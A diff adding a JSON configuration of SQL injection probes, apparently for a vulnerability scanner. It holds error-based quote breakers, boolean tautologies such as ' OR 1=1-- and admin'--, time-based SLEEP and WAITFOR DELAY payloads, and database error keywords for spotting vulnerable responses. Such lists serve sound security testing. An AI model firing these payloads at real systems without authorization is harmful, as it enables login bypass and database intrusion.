@@ -1,0 +1,24 @@
+{
+  "metadata": {
+    "timeout_seconds": 5,
+    "time_based_delay": 5,
+    "db_error_keywords": [
+      "syntax error", "mysql_fetch", "ORA-", "SQLITE_ERROR",
+      "pg_query", "unclosed quotation", "quoted string not properly"
+    ]
+  },
+  "error_based": {
+    "payloads": ["'", "\"", "\\", "')", "'--", "'#", "' --", "/**/"]
+  },
+  "boolean_based": {
+    "true_payloads":  ["' OR '1'='1", "' OR 1=1--", "admin'--"],
+    "false_payloads": ["' OR '1'='2", "' OR 1=2--", "' AND 1=2--"]
+  },
+  "time_based": {
+    "payloads": [
+      "'; SLEEP(5)--",
+      "' OR SLEEP(5)--",
+      "1; WAITFOR DELAY '0:0:5'--"
+    ]
+  }
+}
